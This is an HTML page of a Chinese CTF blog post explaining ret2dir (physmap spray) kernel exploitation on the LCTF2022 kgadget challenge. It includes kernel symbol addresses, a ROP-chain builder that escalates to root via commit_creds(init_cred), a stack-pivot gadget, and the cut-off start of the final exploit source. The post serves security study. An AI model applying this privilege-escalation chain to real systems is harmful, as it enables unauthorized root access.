@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="ret2dir这是一种绕过SMAP&#x2F;SMEP和PXN防护的攻击方式。利用内核空间的direct mapping area（起始位置为0xFFF8880000000000）。Linux对内存的访问采用的是多级页表的方式，将某段物理内存映射到程序的虚拟内存空间中的某段地址。而在Linux内核空间中，还存在着direct mapping area这块区域，对于物理映射到用户态内存的所有物理内存">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kernel pwn 入门 (3)">
+<meta property="og:url" content="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-3/index.html">
+<meta property="og:site_name" content="CoLin&#39;s Pwnhome">
+<meta property="og:description" content="ret2dir这是一种绕过SMAP&#x2F;SMEP和PXN防护的攻击方式。利用内核空间的direct mapping area（起始位置为0xFFF8880000000000）。Linux对内存的访问采用的是多级页表的方式，将某段物理内存映射到程序的虚拟内存空间中的某段地址。而在Linux内核空间中，还存在着direct mapping area这块区域，对于物理映射到用户态内存的所有物理内存">
+<meta property="og:locale">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7cf0ef6e558f499ba8f43706ca7882f8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d5f8bda792ab4cc78fe27e483475f2ad.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d5f8bda792ab4cc78fe27e483475f2ad.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3d9b9d431d0447c7bbfb687dedc89b8a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8b911919d6b44300a6421b0e34089346.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/409a5e9522c34c45a3f5469e52dd2cc5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ec9b7ccdc88146b9ba3fc5a07a7dc84b.png">
+<meta property="article:published_time" content="2023-02-28T14:27:49.000Z">
+<meta property="article:modified_time" content="2023-02-28T14:27:49.379Z">
+<meta property="article:author" content="CoLin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/7cf0ef6e558f499ba8f43706ca7882f8.png">
+
+<link rel="canonical" href="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>Kernel pwn 入门 (3) | CoLin's Pwnhome</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CoLin's Pwnhome</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's Pwnhome">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Kernel pwn 入门 (3)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-28 22:27:49" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:49+08:00">2023-02-28</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h1><p>这是一种绕过SMAP&#x2F;SMEP和PXN防护的攻击方式。利用内核空间的direct mapping area（起始位置为0xFFF8880000000000）。Linux对内存的访问采用的是多级页表的方式，将某段物理内存映射到程序的虚拟内存空间中的某段地址。而在Linux内核空间中，还存在着direct mapping area这块区域，对于物理映射到用户态内存的所有物理内存地址，在这里都能够进行访问，即用户态的每一页被映射的内存空间在这里也一样能够访问，二者访问同一块物理内存空间。</p>
+<p>至于具体的利用方式是如何，还是看题目最为直接。<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9Aret2dir-physmap-spray">主要参考资料与题目来源</a></p>
+<h2 id="LCTF2022-kgadget"><a href="#LCTF2022-kgadget" class="headerlink" title="LCTF2022-kgadget"></a>LCTF2022-kgadget</h2><p><img src="https://img-blog.csdnimg.cn/7cf0ef6e558f499ba8f43706ca7882f8.png" alt="在这里插入图片描述"></p>
+<h3 id="ioctl函数分析"><a href="#ioctl函数分析" class="headerlink" title="ioctl函数分析"></a>ioctl函数分析</h3><p>首先找到ioctl函数，只有一个指令码114514有意义。其中有一个qmemcpy函数，这里的反汇编有一些问题，我们还是找到汇编来仔细看看。</p>
+<p><img src="https://img-blog.csdnimg.cn/d5f8bda792ab4cc78fe27e483475f2ad.png"><br>这里提到了一个结构体pt_regs，我们来看下这是个什么东西。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>看上去像是寄存器组。查询相关<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012489236/article/details/116614606?ops_request_misc=&request_id=&biz_id=102&utm_term=linux%E5%86%85%E6%A0%B8%E6%A0%88%E5%B8%83%E5%B1%80&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-116614606.142%5Ev31%5Econtrol,185%5Ev2%5Econtrol&spm=1018.2226.3001.4187">资料</a>与源码后，渐渐地才搞清楚来龙去脉。</p>
+<p>首先要清楚的是，用户态程序和内核进行交互的最重要的方式就是系统调用。系统调用就是内核开放给用户程序的一个个接口。在每一次触发系统调用时，Linux都会从用户态转为内核态。在转换的过程中，内核会创建一个自己的栈空间，而不会使用用户态的栈空间。</p>
+<p>下面是x86-64位下的<code>THREAD_SIZE</code>值声明，其值应该为页大小左移2位，即16KB。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KASAN_STACK_ORDER 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KASAN_STACK_ORDER 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THREAD_SIZE_ORDER	(2 + KASAN_STACK_ORDER)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THREAD_SIZE  (PAGE_SIZE &lt;&lt; THREAD_SIZE_ORDER)</span></span><br></pre></td></tr></table></figure>
+
+<p>提到pt_regs，就必须要说<code>task_struct</code>结构体，这是Linux系统的<code>PCB</code>（进程控制块），保存有一个进程的所有信息（父子进程、时间、状态等），具体的分析参见<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41209741/article/details/82870876?ops_request_misc=&request_id=&biz_id=102&utm_term=task_struct&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-82870876.142%5Ev31%5Econtrol,185%5Ev2%5Econtrol&spm=1018.2226.3001.4187">资料</a>。其中有一个void*类型的字段stack，存放的就是线程的栈起始地址。通过下面的函数我们可以找到这个线程的pt_regs：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">task_stack_page</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> task_struct *task)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> task-&gt;<span class="built_in">stack</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> task_pt_regs(task) \</span></span><br><span class="line"><span class="meta">(&#123;									\</span></span><br><span class="line"><span class="meta">	unsigned long __ptr = (unsigned long)task_stack_page(task);	\</span></span><br><span class="line"><span class="meta">	__ptr += THREAD_SIZE - TOP_OF_KERNEL_STACK_PADDING;		\</span></span><br><span class="line"><span class="meta">	((struct pt_regs *)__ptr) - 1;					\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的THREAD_SIZE就是栈的大小16KB，后面的TOP_OF_KERNEL_STACK_PADDING取0，也即往上加16KB之后减去一个pt_regs的大小就是线程的pt_regs结构体的位置。</p>
+<p>好，现在我们再回到这道题目上面来。还是这张图，在0x155的lea指令就将rdx的值赋值为了pt_regs的地址值。我们通过上面的pt_regs结构体声明可以计算一下这个结构体的大小，应该为0xA8字节（unsigned long占8字节），因此此时的rax-0xA8就是pt_regs的起始地址。然后这里是将其中的7个属性值全部赋值为无效值，查看pt_regs结构体发现实际上就是销毁了r15，r14，r13，r12，r11，rbp，r10这5个寄存器的值，仅仅保留后面的r9、r8和其他系统调用必需的寄存器。这也与题目中printk打印出来的字符串提示相吻合，只有r8和r9寄存器可用。至于具体用来干嘛，后面再看。</p>
+<p><img src="https://img-blog.csdnimg.cn/d5f8bda792ab4cc78fe27e483475f2ad.png"><br><img src="https://img-blog.csdnimg.cn/3d9b9d431d0447c7bbfb687dedc89b8a.png"></p>
+<p>在printk之后，指令<code>call __x86_indirect_thunk_rbx</code>实际上等同于<code>call rbx</code>。</p>
+<h3 id="release函数分析"><a href="#release函数分析" class="headerlink" title="release函数分析"></a>release函数分析</h3><p><img src="https://img-blog.csdnimg.cn/8b911919d6b44300a6421b0e34089346.png"><br>在release函数中有一个raw_spin_lock函数调用，这是一个自旋锁，用于在底层处理多线程或多进程访问同一个对象的竞争问题。与本题的关系不大，深入的分析参见<a target="_blank" rel="noopener" href="https://blog.csdn.net/DroidPhone/article/details/7395983?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165718771616781685317780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165718771616781685317780&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-7395983-null-null.142%5Ev31%5Econtrol,185%5Ev2%5Econtrol&utm_term=raw_spin_lock&spm=1018.2226.3001.4187">资料</a>。</p>
+<p>之后还有一个pv_ops，使用IDA打开vmlinux之后发现这是一个函数指针数组。其第85个元素指向<code>__raw_callee_save___native_queued_spin_unlock</code>函数，应该也是和内核的互斥锁有关，这里不进行详细分析。</p>
+<p>open、read、write函数与release函数基本上差不多，不做分析。看来对我们有用的就只有ioctl函数了。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>顺便提一句，这道题的bzImage坑了我两天时间，用Linux官方的extract_vmlinux没有办法解压成vmlinux，直到安装了vmlinux-to-elf之后才得以解决，原来这个bzImage是用zstd压缩的，必须安装zstd包才能解压。。。。。。</p>
+<p>本题的ioctl函数中实际上是将传入的第三个参数作为函数指针，在内核中执行。而要知道本题开启了SMEP保护，因此不能传入一个用户态的指针，而应该是内核态指针。</p>
+<p>前面我们提到了direct mapping area这块内核空间，其能够与用户态访问相同的物理地址空间，因此我们可以利用这块空间，在用户态布置好ROP，然后让内核访问这里的空间，就相当于是执行用户态中的ROP。但是话说回来，我们不知道具体哪一块用户态地址和哪一块内核地址指向相同，这就需要我们使用滑梯（slider）这种手段了，通过大量的无效ROP来提升我们攻击成功的概率。</p>
+<h4 id="Step-1-硬编码函数地址"><a href="#Step-1-硬编码函数地址" class="headerlink" title="Step 1: 硬编码函数地址"></a>Step 1: 硬编码函数地址</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -cpu kvm64,+smep,+smap \</span><br><span class="line">        -smp cores=2,threads=2 \</span><br><span class="line">        -kernel bzImage \</span><br><span class="line">        -initrd ./rootfs.cpio \</span><br><span class="line">        -nographic \</span><br><span class="line">        -monitor /dev/null \</span><br><span class="line">        -snapshot \</span><br><span class="line">        -append <span class="string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">        -no-reboot</span><br></pre></td></tr></table></figure>
+
+<p>上面是起qemu的命令，可以看到有nokaslr选项，说明没有开启kaslr，我们通过vmlinux就可以获取到关键函数的内核地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">u_int64_t</span> commit_creds = <span class="number">0xFFFFFFFF810C92E0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">u_int64_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF810C9540</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step-2-申请大空间"><a href="#Step-2-申请大空间" class="headerlink" title="Step 2: 申请大空间"></a>Step 2: 申请大空间</h4><p>接下来，我们需要申请很大的空间，存放ROP链。这里每一次申请大小均为一页的大小，其中mmap函数fd参数为-1表示不需要文件描述符，以匿名的方式分配空间。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map_spray[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step-3-填充空间"><a href="#Step-3-填充空间" class="headerlink" title="Step 3: 填充空间"></a>Step 3: 填充空间</h4><p>我们使用ROP来填充分配到的所有空间，经过ROPgadget查询发现，没有<code>mov rdi, rax; ret</code>这样的gadget，因此我们无法使用<code>commit_creds(prepare_kernel_cred(NULL))</code>来提权，因为内部函数的执行结果保存在rax中，必须要将其转移到rdi才行，这里没有这个gadget，那我们就换一种方式：<code>commit_creds(init_cred)</code>，这里的init_cred在.data段，就是表示root权限的creds结构体。之后我们需要正常返回到用户态中，这里原文使用的是一个函数<code>swapgs_restore_regs_and_return_to_usermode</code>。通过函数名我们可以知道这是一个保存pt_regs结构并且返回到用户态的函数。至于为什么不能像前面两道题那样分别将<code>swapgs</code>和<code>iretq</code>的gadget保存在ROP中，猜测是因为这个vmlinux中没有<code>iretq; ret</code>这样的gadget。</p>
+<p>可以看到下图中，函数一开始将寄存器基本上全pop了一遍，因为正常情况下调用这个函数的时候栈中只剩下pt_regs这个结构体，因此这是将结构体中保存的寄存器值再弹出到寄存器中。由于我们这里是伪造的ROP，因此不需要前面的pop，直接返回到第一个非pop语句即可。</p>
+<p><img src="https://img-blog.csdnimg.cn/409a5e9522c34c45a3f5469e52dd2cc5.png"><br><img src="https://img-blog.csdnimg.cn/ec9b7ccdc88146b9ba3fc5a07a7dc84b.png"><br>上图红框的部分有两个pop指令，需要我们在ROP链中再添加两个无效的值，这也算是ROP到这个函数的一个基本的姿势了。之后只需要跟上我们先前在<code>save_status</code>中保存的值就可以了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>* space)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; page_size / <span class="number">8</span> - <span class="number">0x10</span>; index++)</span><br><span class="line">        space[index] = ret;</span><br><span class="line">    space[index++] = poprdi_ret;</span><br><span class="line">    space[index++] = init_cred;</span><br><span class="line">    space[index++] = commit_creds;</span><br><span class="line">    space[index++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = *(<span class="type">size_t</span>*)getShell;</span><br><span class="line">    space[index++] = user_cs;</span><br><span class="line">    space[index++] = user_rflags;</span><br><span class="line">    space[index++] = user_sp;</span><br><span class="line">    space[index] = user_ss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step-4-构造栈迁移"><a href="#Step-4-构造栈迁移" class="headerlink" title="Step 4: 构造栈迁移"></a>Step 4: 构造栈迁移</h4><p>我们的ROP链都是在用户空间编写的，能够映射到内核空间的某个地方，但是要执行这些ROP还需要我们将栈引导到这些内核映射区中。这就要使用到ioctl函数中的地址执行功能了，可以让函数指针指向一个能为rsp赋值的gadget，可以进行栈迁移。</p>
+<p>需要注意的是，本题的栈迁移构造条件还是较为苛刻的，我们计划将函数指针赋值为一个可能指向我们spray ROP的地址，在其中写入能够add rsp的gadget，这样能够让内核的栈指针指向pt_regs结构，在pt_regs结构中我们只能利用r9和r8这两个寄存器构造ROP，在这两个寄存器中我们需要构造一个栈迁移，即写入诸如pop rsp这一类的gadget。经过测试发现，对于第一步的add rsp，我们构造的ROP距离rsp有0xC0，而有一个gadget<code>add rsp, 0xA0; pop rbx; pop r12; pop r13; ret</code>刚好满足我们的要求。使用这个gadget可以让我们成功进行栈迁移。</p>
+<p>至此，所有的逻辑都已经清晰可见。其本质就是栈迁移到我们构造的地址，只是利用了direct mapping area这个区域的特性而已。</p>
+<p>最终的exp：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-7.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span 